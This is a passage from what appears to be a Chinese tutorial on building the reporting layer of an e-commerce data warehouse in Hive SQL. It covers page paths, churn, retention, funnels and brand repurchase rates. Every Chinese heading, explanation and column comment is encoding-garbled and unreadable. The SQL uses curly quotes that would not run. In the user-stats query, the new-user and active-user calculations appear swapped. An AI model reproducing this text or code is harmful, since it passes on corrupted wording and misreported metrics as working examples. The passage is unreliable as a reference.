sv_count,</p><p>cast(sum(if(page_count_1d=1,1,0))/count(*) as decimal(16,2)) bounce_rate</p><p>from dws_traffic_session_page_view_1d lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-recent_days+1)</p><p>group by recent_days,channel;</p><h4 id="è·¯å¾„åˆ†æ"><a href="#è·¯å¾„åˆ†æ" class="headerlink" title="è·¯å¾„åˆ†æ"></a>è·¯å¾„åˆ†æ</h4><p>ç”¨æˆ·è·¯å¾„åˆ†æï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯æŒ‡ç”¨æˆ·åœ¨APPæˆ–ç½‘ç«™ä¸­çš„è®¿é—®è·¯å¾„ã€‚ä¸ºäº†è¡¡é‡ç½‘ç«™ä¼˜åŒ–çš„æ•ˆæœæˆ–è¥é”€æ¨å¹¿çš„æ•ˆæœï¼Œä»¥åŠäº†è§£ç”¨æˆ·è¡Œä¸ºåå¥½ï¼Œæ—¶å¸¸è¦å¯¹è®¿é—®è·¯å¾„è¿›è¡Œåˆ†æã€‚</p><p>ç”¨æˆ·è®¿é—®è·¯å¾„çš„å¯è§†åŒ–é€šå¸¸ä½¿ç”¨æ¡‘åŸºå›¾ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¯¥å›¾å¯çœŸå®è¿˜åŸç”¨æˆ·çš„è®¿é—®è·¯å¾„ï¼ŒåŒ…æ‹¬é¡µé¢è·³è½¬å’Œé¡µé¢è®¿é—®æ¬¡åºã€‚</p><p>æ¡‘åŸºå›¾éœ€è¦æˆ‘ä»¬æä¾›æ¯ç§é¡µé¢è·³è½¬çš„æ¬¡æ•°ï¼Œæ¯ä¸ªè·³è½¬ç”±source/targetè¡¨ç¤ºï¼ŒsourceæŒ‡è·³è½¬èµ·å§‹é¡µé¢ï¼Œtargetè¡¨ç¤ºè·³è½¬ç»ˆåˆ°é¡µé¢ã€‚</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/c8def23c91792b9acc5726ffaef85605.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_page_path;</p><p>CREATE EXTERNAL TABLE ads_page_path</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` BIGINT COMMENT â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`source` STRING COMMENT â€˜è·³è½¬èµ·å§‹é¡µé¢IDâ€™,</p><p>`target` STRING COMMENT â€˜è·³è½¬ç»ˆåˆ°é¡µé¢IDâ€™,</p><p>`path_count` BIGINT COMMENT â€˜è·³è½¬æ¬¡æ•°â€™</p><p>) COMMENT â€˜é¡µé¢æµè§ˆè·¯å¾„åˆ†æâ€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_page_path/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_page_path</p><p>select * from ads_page_path</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>recent_days,</p><p>source,</p><p>nvl(target,â€™nullâ€™),</p><p>count(*) path_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>concat(â€˜step-â€˜,rn,â€™:â€™,page_id) source,</p><p>concat(â€˜step-â€˜,rn+1,â€™:â€™,next_page_id) target</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>page_id,</p><p>lead(page_id,1,null) over(partition by session_id,recent_days) next_page_id,</p><p>row_number() over (partition by session_id,recent_days order by view_time) rn</p><p>from dwd_traffic_page_view_inc lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-recent_days+1)</p><p>)t1</p><p>)t2</p><p>group by recent_days,source,target;</p><h3 id="ç”¨æˆ·ä¸»é¢˜"><a href="#ç”¨æˆ·ä¸»é¢˜" class="headerlink" title="ç”¨æˆ·ä¸»é¢˜"></a>ç”¨æˆ·ä¸»é¢˜</h3><h4 id="ç”¨æˆ·å˜åŠ¨ç»Ÿè®¡"><a href="#ç”¨æˆ·å˜åŠ¨ç»Ÿè®¡" class="headerlink" title="ç”¨æˆ·å˜åŠ¨ç»Ÿè®¡"></a>ç”¨æˆ·å˜åŠ¨ç»Ÿè®¡</h4><p>è¯¥éœ€æ±‚åŒ…æ‹¬ä¸¤ä¸ªæŒ‡æ ‡ï¼Œåˆ†åˆ«ä¸ºæµå¤±ç”¨æˆ·æ•°å’Œå›æµç”¨æˆ·æ•°ï¼Œä»¥ä¸‹ä¸ºå¯¹ä¸¤ä¸ªæŒ‡æ ‡çš„è§£é‡Šè¯´æ˜ã€‚</p><table><thead><tr><th>ç»Ÿè®¡å‘¨æœŸ</th><th>æŒ‡æ ‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æœ€è¿‘1æ—¥</td><td>æµå¤±ç”¨æˆ·æ•°</td><td>ä¹‹å‰æ´»è·ƒè¿‡çš„ç”¨æˆ·ï¼Œæœ€è¿‘ä¸€æ®µæ—¶é—´æœªæ´»è·ƒï¼Œå°±ç§°ä¸ºæµå¤±ç”¨æˆ·ã€‚æ­¤å¤„è¦æ±‚ç»Ÿè®¡7æ—¥å‰ï¼ˆåªåŒ…å«7æ—¥å‰å½“å¤©ï¼‰æ´»è·ƒï¼Œä½†æœ€è¿‘7æ—¥æœªæ´»è·ƒçš„ç”¨æˆ·æ€»æ•°ã€‚</td></tr><tr><td>æœ€è¿‘1æ—¥</td><td>å›æµç”¨æˆ·æ•°</td><td>ä¹‹å‰çš„æ´»è·ƒç”¨æˆ·ï¼Œä¸€æ®µæ—¶é—´æœªæ´»è·ƒï¼ˆæµå¤±ï¼‰ï¼Œä»Šæ—¥åˆæ´»è·ƒäº†ï¼Œå°±ç§°ä¸ºå›æµç”¨æˆ·ã€‚æ­¤å¤„è¦æ±‚ç»Ÿè®¡å›æµç”¨æˆ·æ€»æ•°ã€‚</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_user_change;</p><p>CREATE EXTERNAL TABLE ads_user_change</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`user_churn_count` BIGINT COMMENT â€˜æµå¤±ç”¨æˆ·æ•°â€™,</p><p>`user_back_count` BIGINT COMMENT â€˜å›æµç”¨æˆ·æ•°â€™</p><p>) COMMENT â€˜ç”¨æˆ·å˜åŠ¨ç»Ÿè®¡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_user_change/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_user_change</p><p>select * from ads_user_change</p><p>union</p><p>select</p><p>churn.dt,</p><p>user_churn_count,</p><p>user_back_count</p><p>from</p><p>(</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>count(*) user_churn_count</p><p>from dws_user_user_login_td</p><p>where dt=â€™2020-06-14â€™</p><p>and login_date_last=date_add(â€˜2020-06-14â€™,-7)</p><p>)churn</p><p>join</p><p>(</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>count(*) user_back_count</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last</p><p>from dws_user_user_login_td</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last login_date_previous</p><p>from dws_user_user_login_td</p><p>where dt=date_add(â€˜2020-06-14â€™,-1)</p><p>)t2</p><p>on t1.user_id=t2.user_id</p><p>where datediff(login_date_last,login_date_previous)&gt;=8</p><p>)back</p><p>on churn.dt=back.dt;</p><h4 id="ç”¨æˆ·ç•™å­˜ç‡"><a href="#ç”¨æˆ·ç•™å­˜ç‡" class="headerlink" title="ç”¨æˆ·ç•™å­˜ç‡"></a>ç”¨æˆ·ç•™å­˜ç‡</h4><p>ç•™å­˜åˆ†æä¸€èˆ¬åŒ…å«æ–°å¢ç•™å­˜å’Œæ´»è·ƒç•™å­˜åˆ†æã€‚</p><p>æ–°å¢ç•™å­˜åˆ†ææ˜¯åˆ†ææŸå¤©çš„æ–°å¢ç”¨æˆ·ä¸­ï¼Œæœ‰å¤šå°‘äººæœ‰åç»­çš„æ´»è·ƒè¡Œä¸ºã€‚æ´»è·ƒç•™å­˜åˆ†ææ˜¯åˆ†ææŸå¤©çš„æ´»è·ƒç”¨æˆ·ä¸­ï¼Œæœ‰å¤šå°‘äººæœ‰åç»­çš„æ´»è·ƒè¡Œä¸ºã€‚</p><p>ç•™å­˜åˆ†ææ˜¯è¡¡é‡äº§å“å¯¹ç”¨æˆ·ä»·å€¼é«˜ä½çš„é‡è¦æŒ‡æ ‡ã€‚</p><p>æ­¤å¤„è¦æ±‚ç»Ÿè®¡æ–°å¢ç•™å­˜ç‡ï¼Œæ–°å¢ç•™å­˜ç‡å…·ä½“æ˜¯æŒ‡ç•™å­˜ç”¨æˆ·æ•°ä¸æ–°å¢ç”¨æˆ·æ•°çš„æ¯”å€¼ï¼Œä¾‹å¦‚2020-06-14æ–°å¢100ä¸ªç”¨æˆ·ï¼Œ1æ—¥ä¹‹åï¼ˆ2020-06-15ï¼‰è¿™100äººä¸­æœ‰80ä¸ªäººæ´»è·ƒäº†ï¼Œé‚£2020-06-14çš„1æ—¥ç•™å­˜æ•°åˆ™ä¸º80ï¼Œ2020-06-14çš„1æ—¥ç•™å­˜ç‡åˆ™ä¸º80%ã€‚</p><p>è¦æ±‚ç»Ÿè®¡æ¯å¤©çš„1è‡³7æ—¥ç•™å­˜ç‡ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/287a3644e35375f85f48b751bb6a16f8.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_user_retention;</p><p>CREATE EXTERNAL TABLE ads_user_retention</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`create_date` STRING COMMENT â€˜ç”¨æˆ·æ–°å¢æ—¥æœŸâ€™,</p><p>`retention_day` INT COMMENT â€˜æˆªè‡³å½“å‰æ—¥æœŸç•™å­˜å¤©æ•°â€™,</p><p>`retention_count` BIGINT COMMENT â€˜ç•™å­˜ç”¨æˆ·æ•°é‡â€™,</p><p>`new_user_count` BIGINT COMMENT â€˜æ–°å¢ç”¨æˆ·æ•°é‡â€™,</p><p>`retention_rate` DECIMAL(16, 2) COMMENT â€˜ç•™å­˜ç‡â€™</p><p>) COMMENT â€˜ç”¨æˆ·ç•™å­˜ç‡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_user_retention/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_user_retention</p><p>select * from ads_user_retention</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>login_date_first create_date,</p><p>datediff(â€˜2020-06-14â€™,login_date_first) retention_day,</p><p>sum(if(login_date_last=â€™2020-06-14â€™,1,0)) retention_count,</p><p>count(*) new_user_count,</p><p>cast(sum(if(login_date_last=â€™2020-06-14â€™,1,0))/count(*)*100 as decimal(16,2))<br>retention_rate</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>date_id login_date_first</p><p>from dwd_user_register_inc</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-7)</p><p>and dt&lt;â€˜2020-06-14â€™</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last</p><p>from dws_user_user_login_td</p><p>where dt=â€™2020-06-14â€™</p><p>)t2</p><p>on t1.user_id=t2.user_id</p><p>group by login_date_first;</p><h4 id="ç”¨æˆ·æ–°å¢æ´»è·ƒç»Ÿè®¡"><a href="#ç”¨æˆ·æ–°å¢æ´»è·ƒç»Ÿè®¡" class="headerlink" title="ç”¨æˆ·æ–°å¢æ´»è·ƒç»Ÿè®¡"></a>ç”¨æˆ·æ–°å¢æ´»è·ƒç»Ÿè®¡</h4><p>éœ€æ±‚è¯´æ˜å¦‚ä¸‹</p><table><thead><tr><th>ç»Ÿè®¡å‘¨æœŸ</th><th>æŒ‡æ ‡</th><th>æŒ‡æ ‡è¯´æ˜</th></tr></thead><tbody><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>æ–°å¢ç”¨æˆ·æ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>æ´»è·ƒç”¨æˆ·æ•°</td><td>ç•¥</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_user_stats;</p><p>CREATE EXTERNAL TABLE ads_user_stats</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` BIGINT COMMENT â€˜æœ€è¿‘næ—¥,1:æœ€è¿‘1æ—¥,7:æœ€è¿‘7æ—¥,30:æœ€è¿‘30æ—¥â€™,</p><p>`new_user_count` BIGINT COMMENT â€˜æ–°å¢ç”¨æˆ·æ•°â€™,</p><p>`active_user_count` BIGINT COMMENT â€˜æ´»è·ƒç”¨æˆ·æ•°â€™</p><p>) COMMENT â€˜ç”¨æˆ·æ–°å¢æ´»è·ƒç»Ÿè®¡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_user_stats/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_user_stats</p><p>select * from ads_user_stats</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>t1.recent_days,</p><p>new_user_count,</p><p>active_user_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(login_date_last&gt;=date_add(â€˜2020-06-14â€™,-recent_days+1),1,0))<br>new_user_count</p><p>from dws_user_user_login_td lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>group by recent_days</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(date_id&gt;=date_add(â€˜2020-06-14â€™,-recent_days+1),1,0)) active_user_count</p><p>from dwd_user_register_inc lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>group by recent_days</p><p>)t2</p><p>on t1.recent_days=t2.recent_days;</p><h4 id="ç”¨æˆ·è¡Œä¸ºæ¼æ–—åˆ†æ"><a href="#ç”¨æˆ·è¡Œä¸ºæ¼æ–—åˆ†æ" class="headerlink" title="ç”¨æˆ·è¡Œä¸ºæ¼æ–—åˆ†æ"></a>ç”¨æˆ·è¡Œä¸ºæ¼æ–—åˆ†æ</h4><p>æ¼æ–—åˆ†ææ˜¯ä¸€ä¸ªæ•°æ®åˆ†ææ¨¡å‹ï¼Œå®ƒèƒ½å¤Ÿç§‘å­¦åæ˜ ä¸€ä¸ªä¸šåŠ¡è¿‡ç¨‹ä»èµ·ç‚¹åˆ°ç»ˆç‚¹å„é˜¶æ®µç”¨æˆ·è½¬åŒ–æƒ…å†µã€‚ç”±äºå…¶èƒ½å°†å„é˜¶æ®µç¯èŠ‚éƒ½å±•ç¤ºå‡ºæ¥ï¼Œæ•…å“ªä¸ªé˜¶æ®µå­˜åœ¨é—®é¢˜ï¼Œå°±èƒ½ä¸€ç›®äº†ç„¶ã€‚</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/f0bc0e0694859a6902469b238252b58a.png" alt="å›¾è¡¨, æ¼æ–—å›¾ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>è¯¥éœ€æ±‚è¦æ±‚ç»Ÿè®¡ä¸€ä¸ªå®Œæ•´çš„è´­ç‰©æµç¨‹å„ä¸ªé˜¶æ®µçš„äººæ•°ï¼Œå…·ä½“è¯´æ˜å¦‚ä¸‹ï¼š</p><table><thead><tr><th>ç»Ÿè®¡å‘¨æœŸ</th><th>æŒ‡æ ‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>é¦–é¡µæµè§ˆäººæ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>å•†å“è¯¦æƒ…é¡µæµè§ˆäººæ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>åŠ è´­äººæ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>ä¸‹å•äººæ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>æ”¯ä»˜äººæ•°</td><td>æ”¯ä»˜æˆåŠŸäººæ•°</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_user_action;</p><p>CREATE EXTERNAL TABLE ads_user_action</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` BIGINT COMMENT â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`home_count` BIGINT COMMENT â€˜æµè§ˆé¦–é¡µäººæ•°â€™,</p><p>`good_detail_count` BIGINT COMMENT â€˜æµè§ˆå•†å“è¯¦æƒ…é¡µäººæ•°â€™,</p><p>`cart_count` BIGINT COMMENT â€˜åŠ å…¥è´­ç‰©è½¦äººæ•°â€™,</p><p>`order_count` BIGINT COMMENT â€˜ä¸‹å•äººæ•°â€™,</p><p>`payment_count` BIGINT COMMENT â€˜æ”¯ä»˜äººæ•°â€™</p><p>) COMMENT â€˜æ¼æ–—åˆ†æâ€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_user_action/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_user_action</p><p>select * from ads_user_action</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>page.recent_days,</p><p>home_count,</p><p>good_detail_count,</p><p>cart_count,</p><p>order_count,</p><p>payment_count</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(if(page_id=â€™homeâ€™,1,0)) home_count,</p><p>sum(if(page_id=â€™good_detailâ€™,1,0)) good_detail_count</p><p>from dws_traffic_page_visitor_page_view_1d</p><p>where dt=â€™2020-06-14â€™</p><p>and page_id in (â€˜homeâ€™,â€™good_detailâ€™)</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(page_id=â€™homeâ€™ and view_count&gt;0,1,0)),</p><p>sum(if(page_id=â€™good_detailâ€™ and view_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>page_id,</p><p>case recent_days</p><p>when 7 then view_count_7d</p><p>when 30 then view_count_30d</p><p>end view_count</p><p>from dws_traffic_page_visitor_page_view_nd lateral view explode(array(7,30)) tmp<br>as recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>and page_id in (â€˜homeâ€™,â€™good_detailâ€™)</p><p>)t1</p><p>group by recent_days</p><p>)page</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) cart_count</p><p>from dws_trade_user_cart_add_1d</p><p>where dt=â€™2020-06-14â€™</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(cart_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then cart_add_count_7d</p><p>when 30 then cart_add_count_30d</p><p>end cart_count</p><p>from dws_trade_user_cart_add_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>group by recent_days</p><p>)cart</p><p>on page.recent_days=cart.recent_days</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) order_count</p><p>from dws_trade_user_order_1d</p><p>where dt=â€™2020-06-14â€™</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from dws_trade_user_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>group by recent_days</p><p>)ord</p><p>on page.recent_days=ord.recent_days</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) payment_count</p><p>from dws_trade_user_payment_1d</p><p>where dt=â€™2020-06-14â€™</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then payment_count_7d</p><p>when 30 then payment_count_30d</p><p>end order_count</p><p>from dws_trade_user_payment_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>group by recent_days</p><p>)pay</p><p>on page.recent_days=pay.recent_days;</p><h4 id="æ–°å¢äº¤æ˜“ç”¨æˆ·ç»Ÿè®¡"><a href="#æ–°å¢äº¤æ˜“ç”¨æˆ·ç»Ÿè®¡" class="headerlink" title="æ–°å¢äº¤æ˜“ç”¨æˆ·ç»Ÿè®¡"></a>æ–°å¢äº¤æ˜“ç”¨æˆ·ç»Ÿè®¡</h4><p>éœ€æ±‚è¯´æ˜å¦‚ä¸‹</p><table><thead><tr><th>ç»Ÿè®¡å‘¨æœŸ</th><th>æŒ‡æ ‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>æ–°å¢ä¸‹å•äººæ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>æ–°å¢æ”¯ä»˜äººæ•°</td><td>ç•¥</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_new_buyer_stats;</p><p>CREATE EXTERNAL TABLE ads_new_buyer_stats</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` BIGINT COMMENT â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`new_order_user_count` BIGINT COMMENT â€˜æ–°å¢ä¸‹å•äººæ•°â€™,</p><p>`new_payment_user_count` BIGINT COMMENT â€˜æ–°å¢æ”¯ä»˜äººæ•°â€™</p><p>) COMMENT â€˜æ–°å¢äº¤æ˜“ç”¨æˆ·ç»Ÿè®¡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_new_buyer_stats/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_new_buyer_stats</p><p>select * from ads_new_buyer_stats</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™,</p><p>odr.recent_days,</p><p>new_order_user_count,</p><p>new_payment_user_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(order_date_first&gt;=date_add(â€˜2020-06-14â€™,-recent_days+1),1,0))<br>new_order_user_count</p><p>from dws_trade_user_order_td lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>group by recent_days</p><p>)odr</p><p>join</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(payment_date_first&gt;=date_add(â€˜2020-06-14â€™,-recent_days+1),1,0))<br>new_payment_user_count</p><p>from dws_trade_user_payment_td lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>group by recent_days</p><p>)pay</p><p>on odr.recent_days=pay.recent_days;</p><h3 id="å•†å“ä¸»é¢˜"><a href="#å•†å“ä¸»é¢˜" class="headerlink" title="å•†å“ä¸»é¢˜"></a>å•†å“ä¸»é¢˜</h3><h4 id="æœ€è¿‘7-30æ—¥å„å“ç‰Œå¤è´­ç‡"><a href="#æœ€è¿‘7-30æ—¥å„å“ç‰Œå¤è´­ç‡" class="headerlink" title="æœ€è¿‘7/30æ—¥å„å“ç‰Œå¤è´­ç‡"></a>æœ€è¿‘7/30æ—¥å„å“ç‰Œå¤è´­ç‡</h4><p>éœ€æ±‚è¯´æ˜å¦‚ä¸‹</p><table><thead><tr><th>ç»Ÿè®¡å‘¨æœŸ</th><th>ç»Ÿè®¡ç²’åº¦</th><th>æŒ‡æ ‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æœ€è¿‘7ã€30æ—¥</td><td>å“ç‰Œ</td><td>å¤è´­ç‡</td><td>é‡å¤è´­ä¹°äººæ•°å è´­ä¹°äººæ•°æ¯”ä¾‹</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_repeat_purchase_by_tm;</p><p>CREATE EXTERNAL TABLE ads_repeat_purchase_by_tm</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` BIGINT COMMENT â€˜æœ€è¿‘å¤©æ•°,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`tm_id` STRING COMMENT â€˜å“ç‰ŒIDâ€™,</p><p>`tm_name` STRING COMMENT â€˜å“ç‰Œåç§°â€™,</p><p>`order_repeat_rate` DECIMAL(16, 2) COMMENT â€˜å¤è´­ç‡â€™</p><p>) COMMENT â€˜å„å“ç‰Œå¤è´­ç‡ç»Ÿè®¡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_repeat_purchase_by_tm/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_repeat_purchase_by_tm</p><p>select * from ads_repeat_purchase_by_tm</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>cast(sum(if(order_count&gt;=2,1,0))/sum(if(order_count&gt;=1,1,0)) as decimal(16,2))</p><p>from</p><p>(</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count) order_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>group by recent_days,user_id,tm_id,tm_name</p><p>)t2</p><p>group by recent_days,tm_id,tm_name;</p><h4 id="å„å“ç‰Œå•†å“äº¤æ˜“ç»Ÿè®¡"><a href="#å„å“ç‰Œå•†å“äº¤æ˜“ç»Ÿè®¡" class="headerlink" title="å„å“ç‰Œå•†å“äº¤æ˜“ç»Ÿè®¡"></a>å„å“ç‰Œå•†å“äº¤æ˜“ç»Ÿè®¡</h4><p>éœ€æ±‚è¯´æ˜å¦‚ä¸‹</p><table><thead><tr><th>ç»Ÿè®¡å‘¨æœŸ</th><th>ç»Ÿè®¡ç²’åº¦</th><th>æŒ‡æ ‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>å“ç‰Œ</td><td>è®¢å•æ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>å“ç‰Œ</td><td>è®¢å•äººæ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>å“ç‰Œ</td><td>é€€å•æ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>å“ç‰Œ</td><td>é€€å•äººæ•°</td><td>ç•¥</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_trade_stats_by_tm;</p><p>CREATE EXTERNAL TABLE ads_trade_stats_by_tm</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` BIGINT COMMENT 